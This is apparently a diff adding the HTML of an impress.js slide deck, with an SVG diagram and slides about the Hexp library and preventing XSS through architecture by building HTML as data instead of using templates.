+<g id="edge13" class="edge"><title>network-&gt;parser</title>
+<path fill="none" stroke="white" stroke-width="3" d="M302.188,-234C308.04,-234 313.892,-234 319.744,-234"></path>
+</g>
+<comment></comment>
+<g id="node20" class="node"><title>bb</title>
+<ellipse fill="blue" stroke="blue" cx="400" cy="-234" rx="1.8" ry="1.8"></ellipse>
+</g>
+<comment></comment>
+<g id="edge14" class="edge"><title>parser-&gt;bb</title>
+<path fill="none" stroke="white" stroke-width="3" d="M380.078,-234C386.096,-234 392.114,-234 398.132,-234"></path>
+</g>
+<comment></comment>
+<g id="edge11" class="edge"><title>aa-&gt;serializer</title>
+<path fill="none" stroke="white" stroke-width="3" d="M111.875,-234C117.778,-234 123.682,-234 129.585,-234"></path>
+</g>
+<comment></comment>
+<g id="node24" class="node"><title>b</title>
+<ellipse fill="blue" stroke="blue" cx="438" cy="-234" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge33" class="edge"><title>bb-&gt;b</title>
+</g>
+<comment></comment>
+<g id="node22" class="node"><title>a</title>
+<ellipse fill="blue" stroke="blue" cx="438" cy="-306" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge17" class="edge"><title>a-&gt;b</title>
+<path fill="none" stroke="white" stroke-width="3" d="M438,-287.831C438,-277 438,-263.288 438,-252.413"></path>
+</g>
+<comment></comment>
+<g id="edge18" class="edge"><title>b-&gt;c</title>
+<path fill="none" stroke="white" stroke-width="3" d="M427.072,-219.43C417.704,-206.938 404.276,-189.034 394.911,-176.549"></path>
+</g>
+<comment></comment>
+<g id="node26" class="node"><title>d</title>
+<ellipse fill="blue" stroke="blue" cx="438" cy="-162" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge20" class="edge"><title>b-&gt;d</title>
+<path fill="none" stroke="white" stroke-width="3" d="M438,-215.831C438,-205 438,-191.288 438,-180.413"></path>
+</g>
+<comment></comment>
+<g id="node28" class="node"><title>e</title>
+<ellipse fill="blue" stroke="blue" cx="492" cy="-162" rx="18" ry="18"></ellipse>
+</g>
+<comment></comment>
+<g id="edge22" class="edge"><title>b-&gt;e</title>
+<path fill="none" stroke="white" stroke-width="3" d="M448.928,-219.43C458.296,-206.938 471.724,-189.034 481.089,-176.549"></path>
+</g>
+</g>
+</svg>
+</div>
+<div class="step" data-x="42000" data-y="0">
+<h1>Abolish Your Templates, Burn Your Helpers</h1>
+</div>
+<div class="step" data-x="43000" data-y="0">
+<h1>Preventing XSS Through Architecture</h1>
+</div>
+<div class="step" data-x="44000" data-y="0">
+<p>Other examples
+<br>- Yesod
+<br>- Noinject</p>
+</div>
+<div class="step" data-x="45000" data-y="0">
+<h1>Hexp</h1>
+</div>
+<div class="step" data-x="46000" data-y="0">
+<h2>Creating nodes</h2>
+<ul>
+<li><p>object</p></li>
+<li><p>sexp</p></li>
+<li><p>builder</p></li>
+</ul>
+</div>
+<div class="step" data-x="47000" data-y="0">
+<h2>Manipulating Nodes</h2>
+</div>
+<div class="step" data-x="48000" data-y="0">
+<h1>Other use cases</h1>
+<ul>
+<li><p>deface</p></li>
+<li><p>populate forms</p></li>
+<li><p>pretty print</p></li>
+<li><p>self contained</p></li>
+</ul>
+</div>
+<div class="step" data-x="49000" data-y="0">
+<h1>Modular (think : CMS)</h1>
+<ul><li><p>discount module</p></li></ul>
+</div>
+<div class="step" data-x="50000" data-y="0">
+<h1>Working with designers</h1>
+<ul><li><p>Living Styleguide FTW</p></li></ul>
+</div>
+<script src="file:///home/arne/github/hexpress/js/impress.js"></script><script>impress().init();</script>
+</body>
+</html>
